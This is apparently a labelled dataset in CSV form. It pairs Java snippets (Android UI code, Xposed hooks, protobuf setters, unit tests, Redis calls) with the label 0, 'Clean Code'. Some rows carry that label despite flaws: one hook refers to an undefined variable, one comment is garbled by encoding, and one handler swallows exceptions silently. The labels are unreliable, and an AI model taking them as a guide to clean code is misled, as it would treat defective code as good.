text,label,text_label
"protected void checkInput(Authorization authorization) throws IllegalInputException {
  if (isEmpty(authorization.getResource()) || isEmpty(authorization.getResourceType()) || isEmpty(authorization.getPrincipal())|| isEmpty(authorization.getPrincipalType())|| authorization.getPermission() < Authorization.PERMISSION_MIN || authorization.getPermission() > Authorization.PERMISSION_MAX)   throw new IllegalInputException();
}
",0,Clean Code
"public float getFloat(Object obj){
  return Platform.UNSAFE.getFloat(obj,fieldOffset);
}
",0,Clean Code
"private void visitPropertyValue(Object value){
  if (isDocument) {
    writeKey();
    writeSeparator();
  }
  writeValue(value.toString());
  if (isDocument) {
    writeLineBreak();
  }
}
",0,Clean Code
"@Test public void test_equals_hash(){
  TokenUsage tu1=new TokenUsage(1,2,3);
  TokenUsage tu2=new TokenUsage(1,2,3);
  assertThat(tu1).isEqualTo(tu1).isNotEqualTo(null).isNotEqualTo(new Object()).isEqualTo(tu2).hasSameHashCodeAs(tu2);
  assertThat(new TokenUsage(null,2,3)).isNotEqualTo(tu1).doesNotHaveSameHashCodeAs(tu1);
  assertThat(new TokenUsage(1,null,3)).isNotEqualTo(tu1).doesNotHaveSameHashCodeAs(tu1);
  assertThat(new TokenUsage(1,2,null)).isNotEqualTo(tu1).doesNotHaveSameHashCodeAs(tu1);
}",0,Clean Code
"@Override public void put(URI uri,Map<String,List<String>> responseHeaders) throws IOException {
  if ((uri == null) || (responseHeaders == null))   return;
  String url=uri.toString();
  for (  String headerKey : responseHeaders.keySet()) {
    if ((headerKey == null) || !(headerKey.equalsIgnoreCase(""Set-Cookie2"") || headerKey.equalsIgnoreCase(""Set-Cookie"")))     continue;
    for (    String headerValue : Objects.requireNonNull(responseHeaders.get(headerKey))) {
      webkitCookieManager.setCookie(url,headerValue);
    }
  }
}",0,Clean Code
"public static void exportPartAsJPEG(final AbstractZyGraph<?,?> zygraph,final String filename) throws IOException {
  Graph2DView view=zygraph.getView();
  final y.io.JPGIOHandler jpg=new y.io.JPGIOHandler();
  jpg.setAntialiasingEnabled(true);
  jpg.setQuality(0.9f);
  exportGraphPartToImageFileFormat(view.getGraph2D(),jpg,filename);
}",0,Clean Code
"int getFakeNum();
",0,Clean Code
"@Specialization protected VmMapping eval(VmMap self){
  var members=EconomicMaps.<Object,ObjectMember>create(self.getLength());
  for (  var entry : self) {
    EconomicMaps.put(members,VmUtils.getKey(entry),VmUtils.createSyntheticObjectEntry("""",VmUtils.getValue(entry)));
  }
  return new VmMapping(VmUtils.createEmptyMaterializedFrame(),BaseModule.getMappingClass().getPrototype(),members);
}
",0,Clean Code
"@Override protected void beforeHookedMethod(MethodHookParam param1) throws Throwable {
  MotionEvent event=(MotionEvent)param1.args[0];
  mGestureDetector.onTouchEvent(event);
  if (!oneFingerPulldownEnabled)   return;
  int mBarState=(int)getObjectField(param.thisObject,""mBarState"");
  if (mBarState != STATUSBAR_MODE_SHADE)   return;
  int w=(int)callMethod(getObjectField(param.thisObject,""mView""),""getMeasuredWidth"");
  float x=event.getX();
  float region=w * statusbarPortion;
  boolean pullDownApproved=(pullDownSide == PULLDOWN_SIDE_RIGHT) ? w - region < x : x < region;
  if (pullDownApproved) {
    callMethod(param.thisObject,""expandWithQs"");
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param1) throws Throwable {
  MotionEvent event=(MotionEvent)param1.args[1];
  mGestureDetector.onTouchEvent(event);
  if (!oneFingerPulldownEnabled)   return;
  if (!(boolean)getObjectField(param.thisObject,""mPulsing"") && !(boolean)getObjectField(param.thisObject,""mDozing"") && (int)getObjectField(param.thisObject,""mBarState"") == STATUSBAR_MODE_SHADE && (boolean)callMethod(param.thisObject,""isFullyCollapsed"")) {
    int w=(int)callMethod(getObjectField(param.thisObject,""mView""),""getMeasuredWidth"");
    float x=event.getX();
    float region=w * statusbarPortion;
    boolean pullDownApproved=(pullDownSide == PULLDOWN_SIDE_RIGHT) ? w - region < x : x < region;
    if (pullDownApproved) {
      callMethod(param.thisObject,""expandWithQs"");
    }
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (oneFingerPullupEnabled && STATUSBAR_MODE_KEYGUARD != (int)getObjectField(NotificationPanelViewController,""mBarState"")) {
    pullUpDetector.onTouchEvent((MotionEvent)param.args[0]);
  }
}",0,Clean Code
"private void initView(){
  ivQRCode=findViewById(R.id.ivQRCode);
  tvAddress=findViewById(R.id.tvAddress);
  refreshQRCode();
  findViewById(R.id.pushLocal).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View v){
      try {
        ClipboardManager manager=(ClipboardManager)PushActivity.this.getSystemService(Context.CLIPBOARD_SERVICE);
        if (manager != null) {
          if (manager.hasPrimaryClip() && manager.getPrimaryClip() != null && manager.getPrimaryClip().getItemCount() > 0) {
            ClipData.Item addedText=manager.getPrimaryClip().getItemAt(0);
            Intent newIntent=new Intent(mContext,DetailActivity.class);
            newIntent.putExtra(""id"",addedText.getText().toString().trim());
            newIntent.putExtra(""sourceKey"",""push_agent"");
            newIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            PushActivity.this.startActivity(newIntent);
          }
        }
      }
 catch (      Throwable th) {
      }
    }
  }
);
}",0,Clean Code
"@Override public GitProvenance buildGitProvenance() throws IncompleteGitConfigException {
  if (StringUtils.isBlank(ciRepositoryUrl) || StringUtils.isBlank(ciCommitRefName) || StringUtils.isBlank(ciCommitSha)) {
    throw new IncompleteGitConfigException();
  }
  return new GitProvenance(UUID.randomUUID(),ciRepositoryUrl,ciCommitRefName,ciCommitSha,null,null,emptyList());
}
",0,Clean Code
"/** 
 * Set a hint to the system about whether this fragment's UI is currently visible to the user. This hint defaults to true and is persistent across fragment instance state save and restore. <p>An app may set this to false to indicate that the fragment's UI is scrolled out of visibility or is otherwise not directly visible to the user. This may be used by the system to prioritize operations such as fragment lifecycle updates or loader ordering behavior.</p> <p><strong>Note:</strong> This method may be called outside of the fragment lifecycle. and thus has no ordering guarantees with regard to fragment lifecycle method calls.</p>
 * @param isVisibleToUser true if this fragment's UI is currently visible to the user (default),false if it is not.
 * @deprecated Use {@link FragmentTransaction#setMaxLifecycle(Fragment,Lifecycle.State)}instead.
 */
@Deprecated public void setUserVisibleHint(boolean isVisibleToUser){
  if (!mUserVisibleHint && isVisibleToUser && mState < STARTED && mFragmentManager != null && isAdded() && mIsCreated) {
    mFragmentManager.performPendingDeferredStart(this);
  }
  mUserVisibleHint=isVisibleToUser;
  mDeferStart=mState < STARTED && !isVisibleToUser;
  if (mSavedFragmentState != null) {
    mSavedUserVisibleHint=isVisibleToUser;
  }
}
",0,Clean Code
"public void setTextAndIcon(CharSequence text,int icon){
  setTextAndIcon(text,icon,null);
}
public void setTextAndIcon(CharSequence text,int icon,Drawable iconDrawable){
  textView.setText(text);
  if (icon != 0 || iconDrawable != null || checkView != null) {
    if (iconDrawable != null) {
      imageView.setImageDrawable(iconDrawable);
    }
 else {
      imageView.setImageResource(icon);
    }
    imageView.setVisibility(VISIBLE);
    textView.setPadding(LocaleController.isRTL ? 0 : AndroidUtilities.dp(43),0,LocaleController.isRTL ? AndroidUtilities.dp(43) : 0,0);
  }
 else {
    imageView.setVisibility(INVISIBLE);
    textView.setPadding(0,0,0,0);
  }
}",0,Clean Code
"/** 
 * Sets the value of the internal enum store. This does not do any validity checks, so be sure to use appropriate value constants from  {@link SceneGroupRefreshTypeOuterClass.SceneGroupRefreshType}. Setting an invalid value can cause  {@link SceneGroupRefreshInfo#getGroupRefreshType()} to return null
 * @param value the numeric wire value to set
 * @return this
 */
public SceneGroupRefreshInfo setGroupRefreshTypeValue(final int value){
  bitField0_|=0x00000004;
  groupRefreshType=value;
  return this;
}",0,Clean Code
"@Nullable public Rect intersect(@NotNull Rect other){
  assert other != null : ""Rect::intersect expected other != null"";
  if (_right <= other._left || other._right <= _left || _bottom <= other._top || other._bottom <= _top)   return null;
  return new Rect(Math.max(_left,other._left),Math.max(_top,other._top),Math.min(_right,other._right),Math.min(_bottom,other._bottom));
}
",0,Clean Code
"@Test(expected=ConstraintViolationException.class) public void testGetExecutionStatusNoWorkflowId(){
  try {
    workflowService.getExecutionStatus("""",true);
  }
 catch (  ConstraintViolationException ex) {
    assertEquals(1,ex.getConstraintViolations().size());
    Set<String> messages=getConstraintViolationMessages(ex.getConstraintViolations());
    assertTrue(messages.contains(""WorkflowId cannot be null or empty.""));
    throw ex;
  }
}",0,Clean Code
"public int getBorder(int[][] grid,int x,int y){
  int m=grid.length;
  int n=grid[0].length;
  if (x < 0 || x >= m || y < 0 || y >= n || grid[x][y] == 0) {
    return 1;
  }
  if (grid[x][y] == 2) {
    return 0;
  }
  grid[x][y]=2;
  int res=0;
  for (  int[] foot : footprints) {
    res+=getBorder(grid,x + foot[0],y + foot[1]);
  }
  return res;
}",0,Clean Code
"public HideBubbleHook(Context context){
  if (!SettingHelper.getInstance().isEnable(SettingHelper.beauty_bubble_hide_key))   return;
  final Class<?> messageBubbleView=findClassIfExists(""com.netease.cloudmusic.ui.MessageBubbleView"",context.getClassLoader());
  final Class<?> messageBubbleView_800=findClassIfExists(""com.netease.cloudmusic.theme.ui.MessageBubbleView"",context.getClassLoader());
  findAndHookMethod(View.class,""setVisibility"",int.class,new XC_MethodHook(){
    @Override protected void beforeHookedMethod(    XC_MethodHook.MethodHookParam param){
      if ((messageBubbleView != null && param.thisObject.getClass() == messageBubbleView) || (messageBubbleView_800 != null && param.thisObject.getClass() == messageBubbleView_800)) {
        param.args[0]=View.GONE;
      }
    }
  }
);
}",0,Clean Code
"@Override public Long lpush(String key,String... string){
  try (Jedis jedis=jedisPool.getResource()){
    return jedis.lpush(key,string);
  }
 }
",0,Clean Code
"public void onResume(){
  isPaused=false;
  if (showKeyboardOnResume) {
    showKeyboardOnResume=false;
    editText.requestFocus();
    AndroidUtilities.showKeyboard(editText);
    if (!AndroidUtilities.usingHardwareInput && !keyboardVisible && !AndroidUtilities.isInMultiwindow&& !AndroidUtilities.isTablet()) {
      waitingForKeyboardOpen=true;
      onWaitingForKeyboard();
      AndroidUtilities.cancelRunOnUIThread(openKeyboardRunnable);
      AndroidUtilities.runOnUIThread(openKeyboardRunnable,100);
    }
  }
}",0,Clean Code
"@Override public ModuleFile queryModuleFile(ModuleFile moduleFile){
  return lambdaQuery().eq(ModuleFile::getModuleId,moduleFile.getModuleId()).eq(ModuleFile::getDataId,moduleFile.getDataId()).one();
}
",0,Clean Code
"private int getContainerViewWidth(){
  return getContainerViewWidth(currentEditMode);
}
private int getContainerViewWidth(int mode){
  int width=containerView.getWidth();
  if (mode == 1 || mode == 0 && sendPhotoType == SELECT_TYPE_AVATAR) {
    width-=AndroidUtilities.dp(32);
  }
 else   if (mode != 0 && mode != 3) {
    width-=AndroidUtilities.dp(28);
  }
  return width;
}",0,Clean Code
"/** 
 * 鏍规嵁ID淇敼
 */
void updById(FolderEntity entity);
",0,Clean Code
"private void updateMaskBoundsInternal(Rect b){
  mMaskMatrix.setScale(b.width() / MASK_SIZE,b.height() / MASK_SIZE);
  sMask.transform(mMaskMatrix,mMaskScaleOnly);
  mMaskMatrix.postTranslate(b.left,b.top);
  sMask.transform(mMaskMatrix,mMask);
  if (mLayersBitmap == null || mLayersBitmap.getWidth() != b.width() || mLayersBitmap.getHeight() != b.height()) {
    mLayersBitmap=Bitmap.createBitmap(b.width(),b.height(),Bitmap.Config.ARGB_8888);
  }
  mPaint.setShader(null);
  mTransparentRegion.setEmpty();
  mLayersShader=null;
}",0,Clean Code
"@Override public Yaml.Sequence visitSequence(Yaml.Sequence existingSeq,ExecutionContext ctx){
  Cursor parent=getCursor().getParent();
  if (matcher.matches(parent) && !existingSeq.getMarkers().findFirst(AlreadyReplaced.class).filter(m -> m.getFind().equals(value)).isPresent() && checkExistingSequenceValues(existingSeq,parent)) {
    return appendToSequence(existingSeq,this.value,ctx);
  }
  return super.visitSequence(existingSeq,ctx);
}
",0,Clean Code
"public GGProRecommendGameInfo(GProRecommendGameInfo gProRecommendGameInfo){
  this.mInfo=gProRecommendGameInfo;
}
",0,Clean Code
"/** 
 * <code>optional bool is_protected = 12;</code>
 * @return this
 */
public Equipment clearIsProtected(){
  bitField0_&=~0x00000100;
  isProtected=false;
  return this;
}",0,Clean Code
"/** 
 * @param value The numeric wire value of the corresponding enum entry.
 * @return The enum associated with the given numeric wire value, or null if unknown.
 */
public static BattleEndReason forNumber(int value){
  return BattleEndReasonConverter.INSTANCE.forNumber(value);
}
@Override public final BattleEndReason forNumber(final int value){
  if (value >= 0 && value < lookup.length) {
    return lookup[value];
  }
  return null;
}",0,Clean Code
"private boolean transferLoadArray(StoreArray store,LoadArray load){
  Var i=store.getArrayAccess().getIndex();
  Var j=load.getArrayAccess().getIndex();
  CPFact storeOut=solver.getOutFact(store);
  CPFact loadOut=solver.getOutFact(load);
  Value vi=storeOut.get(i);
  Value vj=loadOut.get(j);
  if (!vi.isUndef() && !vj.isUndef()) {
    if (vi.isConstant() && vj.isConstant() && vi.equals(vj) || vi.isNAC() || vj.isNAC()) {
      Var x=store.getRValue();
      Value vx=storeOut.get(x);
      Var y=load.getLValue();
      Value oldVy=loadOut.get(y);
      Value newVy=cp.meetValue(oldVy,vx);
      return loadOut.update(y,newVy);
    }
  }
  return false;
}
",0,Clean Code
"@Override public String toString(){
  return ""ComputeSalaryDataBO{"" + ""isSyncInsuranceData="" + isSyncInsuranceData + "", sRecordId=""+ sRecordId+ '}';
}
",0,Clean Code
"@Test public void imageOverrideConnectionProperties(){
  new ApplicationContextRunner().withPropertyValues(""spring.ai.zhipuai.base-url=TEST_BASE_URL"",""spring.ai.zhipuai.api-key=abc123"",""spring.ai.zhipuai.image.base-url=TEST_BASE_URL2"",""spring.ai.zhipuai.image.api-key=456"",""spring.ai.zhipuai.image.options.model=MODEL_XYZ"").withConfiguration(AutoConfigurations.of(SpringAiRetryAutoConfiguration.class,RestClientAutoConfiguration.class,ZhiPuAiAutoConfiguration.class)).run(context -> {
    var imageProperties=context.getBean(ZhiPuAiImageProperties.class);
    var connectionProperties=context.getBean(ZhiPuAiConnectionProperties.class);
    assertThat(connectionProperties.getApiKey()).isEqualTo(""abc123"");
    assertThat(connectionProperties.getBaseUrl()).isEqualTo(""TEST_BASE_URL"");
    assertThat(imageProperties.getApiKey()).isEqualTo(""456"");
    assertThat(imageProperties.getBaseUrl()).isEqualTo(""TEST_BASE_URL2"");
    assertThat(imageProperties.getOptions().getModel()).isEqualTo(""MODEL_XYZ"");
  }
);
}",0,Clean Code
